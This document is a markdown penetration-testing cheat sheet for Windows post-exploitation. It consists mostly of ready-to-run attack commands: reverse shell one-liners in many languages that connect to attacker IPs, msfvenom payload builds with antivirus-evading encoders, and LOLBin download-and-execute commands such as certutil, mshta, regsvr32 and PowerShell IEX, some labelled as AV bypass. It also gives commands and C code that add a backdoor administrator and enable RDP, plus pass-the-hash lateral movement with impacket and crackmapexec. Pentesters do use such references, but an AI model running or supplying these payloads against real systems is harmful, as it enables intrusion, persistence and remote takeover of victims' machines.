# Reverse shell
## Listener 
Before any reverse shell, you need to set up the listener, which will listen to a port and receive connections:
```
nc -nlvp <PORT>
rlwrap nc -nlvp <PORT>
```
## Netcat Traditional
```shell
nc -e cmd.exe 10.0.0.1 4242
```
## Powershell
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
```powershell
powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
```
## Powercat
```
powercat -c 10.11.0.4 -p 443 -e cmd.exe
```
Or start bind shell listener
```
powercat -l -p 443 -e cmd.exe
```
And connect from kali:
```
nc 10.11.0.4 443
```
## Perl
```perl
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

# To confirm on windows: 
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Python
Python2:
```powershell
python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.0.0.1', 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```
Python3:
```powershell
python.exe -c "import socket,os,threading,subprocess as sp;p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect(('10.0.0.1',4242));threading.Thread(target=exec,args=(\"while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\",globals()),daemon=True).start();threading.Thread(target=exec,args=(\"while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\",globals())).start()"
```
## Ruby
```ruby
ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

# To confirm on windows: 
ruby -rsocket -e'exit if fork;c=TCPSocket.new("10.0.0.1","4242");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
```
## Java
```java
String host="127.0.0.1";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
### Java Alternative
**NOTE**: This is more stealthy
```java
Thread thread = new Thread(){
    public void run(){
        // Reverse shell here
    }
}
thread.start();
```
## Lua
```powershell
lua5.1 -e 'local host, port = "10.0.0.1", 4242 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## Groovy
by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) NOTE: Java reverse shell also work for Groovy
```java
String host="10.0.0.1";
int port=4242;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
### Groovy Alternative
**NOTE**: This is more stealthy
```java
Thread.start {
    // Reverse shell here
}
```
## Dart
```java
import 'dart:io';
import 'dart:convert';

main() {
  Socket.connect("10.0.0.1", 4242).then((socket) {
    socket.listen((data) {
      Process.start('powershell.exe', []).then((Process process) {
        process.stdin.writeln(new String.fromCharCodes(data).trim());
        process.stdout
          .transform(utf8.decoder)
          .listen((output) { socket.write(output); });
      });
    },
    onDone: () {
      socket.destroy();
    });
  });
}
```
# Golang
```
package mainimport (  
 "bufio"  
 "flag"  
 "fmt"  
 "net"  
 "os"  
 "os/exec"  
 "runtime"  
)func get\_arch\_message_format(msg string) (string, \[\]string) {  
 var exe string  
 os := runtime.GOOS  
 switch os {  
 case "windows":  
  exe = "cmd"  
 case "linux":  
  exe = "/bin/sh"  
 }  
 args := \[\]string{}  
 if exe == "cmd" {  
  args = append(args, "/C")  
 } else {  
  args = append(args, "-c")  
 }  
 args = append(args, msg)  
 return exe, args  
}func main() {args := os.Args  
 if len(args) < 2 {  
  fmt.Println("Not enough arguments!")  
  fmt.Println("Usage: app -i 10.10.10.10 -p 8089")  
  return  
 }I_P := flag.String("i", "", "Host to connect to")  
 L_PORT := flag.String("p", "", "Port to listen on")  
 flag.Parse()conn, _ := net.Dial("tcp", fmt.Sprintf("%s:%s", \*I\_P, \*L\_PORT))for {  
  cwd, _ := os.Getwd()  
  fmt.Fprintf(conn, "\\n%s> ", cwd)  
  msg, _ := bufio.NewReader(conn).ReadString('\\n')  
  exe, args := get\_arch\_message_format(msg)  
  out, err := exec.Command(exe, args...).Output()  
  if err != nil {  
   fmt.Println(conn, "\\n\\n%s\\n", err)  
  }  
  fmt.Fprintf(conn, "%s", out)  
 }  
}
```
## MsfVenom
```
# List formats
msfvenom --list formats
# List payloads
msfvenom --payload --list-options | grep windows
```
### BAT
mostly used with **JuicyPotato** exploit.
```
msfvenom -p cmd/windows/reverse_powershell lhost=10.10.12.15 lport=4444 > shell.bat
```
### EXE
Staged reverse TCP:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe
```
Non-Staged reverse TCP:
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f exe -o non_staged.exe
```
64bit payload:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -o shell.exe
```
Embedded payload:
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
# Windows reverse shell embedded into plink  
```
### Powershell
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -i 9 -f psh -o shell.ps1
```
### Sh
```
msfvenom -p cmd/unix/reverse_bash LHOST="10.0.0.1" LPORT=4242 -f raw > shell.sh
```
### ELF
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f elf > shell.elf
```
### Python
```
msfvenom -p cmd/unix/reverse_python LHOST="10.0.0.1" LPORT=4242 -f raw > shell.py
```
### Perl
```
msfvenom -p cmd/unix/reverse_perl LHOST="10.0.0.1" LPORT=4242 -f raw > shell.pl
```
### PHP
```
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f raw -o shell.php
# Or this crazy syntax
msfvenom -p php/meterpreter_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '
```
### ASP
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f asp > shell.asp
```
### ASPX
```
msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.16.3 LPORT=4444 > shell.aspx
```
### JSP
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw > shell.jsp
```
### Java WAR
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f war > shell.war
```
### MSI
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f msi -o filename.msi
# Or this crazy syntax
msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST="10.0.0.1" LPORT=4242 -f msi -o filename.msi
```
Executing msi file:
```
msiexec /quiet /qn /i C:\\Users\\filename.msi
```
### MACHO
```
msfvenom -p osx/x86/shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f macho > shell.macho
```
# Download and execute methods
## Downloaded files location 
```
C:\\Users\\username\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\
C:\\Users\\username\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\subdir
C:\\Windows\\ServiceProfiles\\LocalService\\AppData\\Local\\Temp\\TfsStore\\Tfs_DAV\
```
## Default writeable folders
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\spool\printers
C:\Windows\System32\spool\servers
C:\Windows\tracing
C:\Windows\Temp
C:\Users\Public
C:\Windows\Tasks
C:\Windows\System32\tasks
C:\Windows\SysWOW64\tasks
C:\Windows\System32\tasks_migrated\microsoft\windows\pls\system
C:\Windows\SysWOW64\tasks\microsoft\windows\pls\system
C:\Windows\debug\wia
C:\Windows\registration\crmlog
C:\Windows\System32\com\dmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\System32\fxstmp
C:\Windows\SysWOW64\fxstmp
```
## HTTP
### Wget
#### Downloading files
```
wget -O "C:\home\student\pwc.ps1" http://192.168.119.244/tools/powercat.ps1
```
### Curl
#### Downloading files
### Cmd
#### Running a script from remote host
```
cmd.exe /k < \\webdavserver\folder\batchfile.txt
```
### Powershell
Default powershell locations:
```
C:\windows\syswow64\windowspowershell\v1.0\powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell
```
#### Uploading files
Encode and output to base64 text from our binary:
```
powershell -C "& {$outpath = (Join-Path (pwd) 'out_base64.txt'); $inpath = (Join-Path (pwd) 'file.exe'); [IO.File]::WriteAllText($outpath, ([convert]::ToBase64String(([IO.File]::ReadAllBytes($inpath)))))}"
```
Decode and create our binary file based on our base64 output from above:
```
powershell -C "& {$outpath = (Join-Path (pwd) 'file2.exe'); $inpath = (Join-Path (pwd) 'out_base64.txt'); [IO.File]::WriteAllBytes($outpath, ([convert]::FromBase64String(([IO.File]::ReadAllText($inpath)))))}"
```
#### Downloading files

In PowerShell 2.x:
```
powershell -Command '$WebClient = New-Object System.Net.WebClient;$WebClient.DownloadFile("http://10.0.0.1/path/to/file","C:\path\to\file")'
```  
Can also be dumped into a script:
```
echo $webclient = New-Object System.Net.WebClient > wget.ps1
echo $url = "http://10.0.0.1:4444/file.exe" >> wget.ps1
echo $output = "C:\Windows\Temp\file.exe" >> wget.ps1
echo $webclient.DownloadFile($url,$output) >> wget.ps1
# Execute the script with
powershell wget.ps1 
# or the crazy syntax above  
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```
In PowerShell 3 and above:
```
powershell -Command 'Invoke-WebRequest -Uri "http://10.0.0.1/path/to/file" -OutFile "C:\path\to\file"'
```
```
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex"
```
#### Running a Powershell script from remote host (Bypass AV)
Voir [Cheatsheet]( https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/windows/powershell.rst#running-a-powershell-script-from-command-line ).
```
powershell IEX(New-Object Net.Webclient).downloadstring('http://<attacker-ip>:<attacker-port>/script.ps1')
```    
```
powershell -noexit -file "C:\path\to\script.ps1"
```    
Bypass execution policy:
```
powershell -executionPolicy bypass -noexit -file "C:\path\to\script.ps1"
```
Run with arguments:
```
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())
```
Execute a specific method from an assembly:
```
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/lib.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```
### Powercat
#### Uploading files
On Kali:
```
sudo nc -lnvp 443 > receiving_powercat.ps1
```
On Windows:
```
powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1
```
### CertReq
#### Downloading files
```
CertReq -Post -config https://example.org/ c:\windows\win.ini output.txt
```
### CertUtil
#### Uploading files
Encode and output to base64 text from our binary:
```
certutil -encode data.txt tmp.b64 && findstr /v /c:- tmp.b64 > data.b64
```
Decode and create our binary file based on our base64 output from above:
```
certutil -decode data.b64 data.txt
```
#### Downloading files
```
certutil.exe -urlcache -split -f http://10.0.0.1:4444/file.exe C:\Windows\Temp\file.exe
```
#### Running a script from remote host
Payload.dll:
```
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```
Payload.exe:
```
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```
### BITSAdmin
#### Downloading files
```
bitsadmin /transfer myDownloadJob /download /priority normal http://10.0.0.1:4444/file.exe C:\Windows\Temp\file.exe
```
```
bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1
```
#### Running a script from remote host
```
bitsadmin /transfer mydownloadjob /download /priority normal http://<attackerIP>/xyz.exe C:\\Users\\%USERNAME%\\AppData\\local\\temp\\xyz.exe
```
### Desktopimgdownldr
#### Downloading files
```
set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr
```
### VBS Script
#### Downloading files
```
echo strFileURL = "http://10.0.0.1:4444/file.exe" >> downloadfile.vbs
echo strHDLocation = "C:\Windows\Temp\file.exe" >> downloadfile.vbs
echo Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") >> downloadfile.vbs
echo objXMLHTTP.open "GET", strFileURL, false >> downloadfile.vbs
echo objXMLHTTP.send() >> downloadfile.vbs
echo If objXMLHTTP.Status = 200 Then >> downloadfile.vbs
echo Set objADOStream = CreateObject("ADODB.Stream") >> downloadfile.vbs
echo objADOStream.Open >> downloadfile.vbs
echo objADOStream.Type = 1 'adTypeBinary >> downloadfile.vbs
echo objADOStream.Write objXMLHTTP.ResponseBody >> downloadfile.vbs
echo objADOStream.Position = 0 >> downloadfile.vbs
echo Set objFSO = CreateObject("Scripting.FileSystemObject") >> downloadfile.vbs
echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >> downloadfile.vbs
echo Set objFSO = Nothing >> downloadfile.vbs
echo objADOStream.SaveToFile strHDLocation >> downloadfile.vbs
echo objADOStream.Close >> downloadfile.vbs
echo Set objADOStream = Nothing >> downloadfile.vbs
echo End if >> downloadfile.vbs
echo Set objXMLHTTP = Nothing >> downloadfile.vbs
cscript downloadfile.vbs
```
or
```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
cscript wget.vbs http://192.168.10.5/evil.exe evil.exe
```
#### Running a script from remote host
```
cscript //E:jscript \\webdavserver\folder\payload.txt
```
### Mshta
#### Running a script from remote host
```
mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
```
```
mshta http://webserver/payload.hta
```
```
mshta \\webdavserver\folder\payload.hta
```
### Rundll32
#### Running a script from remote host
```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
```
```
rundll32 \\webdavserver\folder\payload.dll,entrypoint
```
### Regasm / Regsvc
#### Running a script from remote host
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
```
### Regsvr32
#### Running a script from remote host
```
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
```
```
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
```
### Odbconf
#### Running a script from remote host
```
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
```
### Msbuild
#### Running a script from remote host
```
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```
### Diantz
#### Downloading files
```
diantz.exe \\remotemachine\pathToFile\file.exe c:\destinationFolder\file.cab
```
### Esentutl
#### Downloading files
```
esentutl.exe /y \\live.sysinternals.com\tools\adrestore.exe /d \\otherwebdavserver\webdav\adrestore.exe /o
```
### Expand
#### Downloading files
```
expand \\webdav\folder\file.bat c:\ADS\file.bat
```
### Extrac32
#### Downloading files
```
extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt
```
### Findstr
#### Downloading files
```
findstr /V /L W3AllLov3DonaldTrump \\webdavserver\folder\file.exe > c:\ADS\file.exe
```
### GfxDownloadWrapper
#### Downloading files
```
C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_[0-9]+\GfxDownloadWrapper.exe "URL" "DESTINATION FILE"
```
### Hh
#### Downloading files
```
HH.exe http://some.url/script.ps1
```
### leexec
#### Downloading files
```
ieexec.exe http://x.x.x.x:8080/bypass.exe
```
### Makecab
#### Downloading files
```
makecab \\webdavserver\webdav\file.exe C:\Folder\file.cab
```
### MpCmdRun
#### Downloading files
```
MpCmdRun.exe -DownloadFile -url <URL> -path <path> //Windows Defender executable
```
### Replace
#### Downloading files
```
replace.exe \\webdav.host.com\foo\bar.exe c:\outdir /A
```
### Excel
#### Downloading files
```
Excel.exe http://192.168.1.10/TeamsAddinLoader.dll
```
### Powerpnt
#### Downloading files
```
Powerpnt.exe "http://192.168.1.10/TeamsAddinLoader.dll"
```
### Squirrel
#### Downloading files
```
squirrel.exe --download [url to package]
```
### Update
#### Downloading files
```
Update.exe --download [url to package]
```
### Winword
#### Downloading files
```
winword.exe "http://192.168.1.10/TeamsAddinLoader.dll"
```
### Wsl
#### Downloading files
```
wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'
```
### Debug.exe (Windows 32bits)
#### Downloading files
This is a crazy technique that works on windows 32 bit machines. Basically the idea is to use the `debug.exe` program. It is used to inspect binaries, like a debugger. But it can also rebuild them from hex. So the idea is that we take a binaries, like `netcat`. And then disassemble it into hex, paste it into a file on the compromised machine, and then assemble it with `debug.exe`.

`Debug.exe` can only assemble 64 kb. So we need to use files smaller than that. We can use upx to compress it even more. So let's do that:
```
upx -9 nc.exe
```
Now it only weights 29 kb. Perfect. So now let's disassemble it:
```
wine exe2bat.exe nc.exe nc.txt
```
Now we just copy-past the text into our windows-shell. And it will automatically create a file called nc.exe
## SMB
### Enable SMBv1 (client)

```
Enable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol-Client" -All
```
```
Set-ItemProperty -Path   "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanWorkstation\\Parameters" SMB1 -Type DWORD -Value   1 -Force
```
### Enable SMBv2/3 (client)
```
Enable-WindowsOptionalFeature -Online -FeatureName "SMB2Protocol-Client" -All
```
```
Set-ItemProperty -Path   "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanWorkstation\\Parameters" SMB2 -Type DWORD -Value   1 -Force
```
### Enable insecure guest authentication (client)
```
Set-itemproperty -name AllowInsecureGuestAuth -path "HKLM:\\System\\CurrentControlSet\\Services\\LanManWorkstation\\Parameters" -value "1"
```
```
reg add "HKLM:\System\CurrentControlSet\Services\LanmanWorkstation\Parameters\AllowInsecureGuestAuth" /v Restrict_Run /t REG_DWORD /d 1 /f
```
### Downloading files

```
copy \\10.0.0.1\kali\file.exe C:\Windows\Temp\file.exe
```
### Uploading files

```
copy C:\Windows\Temp\file.exe \\10.0.0.1\kali\file.exe
```
## Netcat
### Downloading files
On Kali run :
```
nc -nvlp <PORT> < /path/to/file.exe
```
On Windosw run:
```
nc.exe -nv <IP> <PORT> > /path/to/file.exe
```
### Uploading files
On Kali run:
```
nc -nvlp <PORT> > /path/to/file.exe
```
On Windows run:
```
nc.exe -nv <IP> <PORT> < file.exe
```
## FTP
### Downloading files
Create a text file with the commands you wish to use:
```
echo open 192.168.1.78 > ftp.txt
echo binary >> ftp.txt
echo get test.txt >> ftp.txt
echo bye >> ftp.txt
```
Then execute the commands in the file with the following command:
```
ftp -A -s:ftp.txt
```
### Downloading files (Authenticated)
Create a text file with the commands you wish to use:
```
echo open 192.168.1.78 > ftp.txt
echo USER asshat>> ftp.txt
echo mysecretpassword>> ftp.txt
echo bin >> ftp.txt
echo GET test.exe >> ftp.txt
echo bye >> ftp.txt
```
Then execute the commands in the file with the following command:
```
ftp -v -n -s:ftp.txt
```
### Uploading files
Create a text file with the commands you wish to use:
```
echo open 192.168.1.78 > ftp.txt
echo binary >> ftp.txt
echo put test.txt >> ftp.txt
echo bye >> ftp.txt
```
Then execute the commands in the file with the following command:
```
ftp -A -s:ftp.txt
```
## TFTP
### Downloading files
```
tftp -i 10.0.0.1 GET file.exe
```
### Uploading files
```
tftp -i 10.0.0.1 PUT file.exe
```
# Generate Malicious Executables
## Malicious code
### Cmd
#### Run executable in backgroud
```
start /B program
```
#### Add Admin & Enable RDP
```
net user /add hacked Password1
net localgroup administrators hacked /add
net localgroup Administrateurs hacked /add (For French target)
net localgroup "Remote Desktop Users" hacked /add
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
netsh firewall set service type = REMOTEDESKTOP mode = ENABLE scope = CUSTOM addresses = 10.0.0.1
```
### C Code
#### Addadmin.c
```
#include <stdlib.h>

int main ()
{

	int i;

	i = system ("net user evil Ev!lpass /add");
	i = system ("net localgroup administrators evil /add");

		return 0;
}
```
## Exe builder
### MsfVenom (cmd)
\*Note: On x64 machine you should use bat2exe.bat to create 64 bit executable\*
```
msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o exploit.exe
```
### GCC (C Code)
Write and compile malicious exe files.
For 32bit environment:
```
sudo i686-w64-mingw32-gcc exploit.c -o exploit32.exe
```
For 64bit environment:
```
sudo x86_64-w64-mingw32-gcc exploit.c -o exploit64.exe
```
# Using credentials 

## Winexe
```
winexe -U DOMAIN/username%password //10.10.10.10 cmd.exe
```
## WinRM
Using public ruby script:
```
ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'
ruby evil-winrm.rb -i 10.0.0.20 -u username -H BD1C6503987F8FF006296118F359FA79
ruby evil-winrm.rb -i 10.0.0.20 -u username -p password -r domain.local
```
or using a custom ruby code to interact with the WinRM service:
```
require 'winrm'

conn = WinRM::Connection.new( 
  endpoint: 'http://ip:5985/wsman',
  user: 'domain/user',
  password: 'password',
)

command=""
conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        print "PS > "
        command = gets        
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end    
    puts "Exiting with code #{output.exitcode}"
end
```
### Download file (Bypass AV)
```
*Evil-WinRM* PS > Bypass-4MSI
*Evil-WinRM* PS > IEX([Net.Webclient]::new().DownloadString("http://127.0.0.1/PowerView.ps1"))
```
## Crackmapexec
```
cme smb 1.1.1.1 -u Administrator -H ":5858d47a41e40b40f294b" -x 'whoami' # cmd
cme smb 0.0.0.0 -u Administrator -H ":5858d47a41e40b40f294b" -X 'whoami' # powershell
cme smb 1.1.1.1 -u Administrator -H ":5858d47a41e40b40f294b" --exec-method atexec -x 'whoami'
cme smb 1.1.1.1 -u Administrator -H ":5858d47a41e40b40f294b" --exec-method wmiexec -x 'whoami'
cme smb 1.1.1.1 -u Administrator -H ":5858d47a41e40b40f294b" --exec-method smbexec -x 'whoami'
```
## Impacket
```
# PSEXEC like functionality example using RemComSv (noisy)
python psexec.py DOMAIN/username:password@10.10.10.10

# A similar approach to PSEXEC w/o using RemComSvc
python smbexec.py DOMAIN/username:password@10.10.10.10

# A semi-interactive shell, used through Windows Management Instrumentation. 
python wmiexec.py DOMAIN/username:password@10.10.10.10
python wmiexec.py domain.local/user@10.0.0.20 -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79

# A semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints. 
python atexec.py DOMAIN/username:password@10.10.10.10

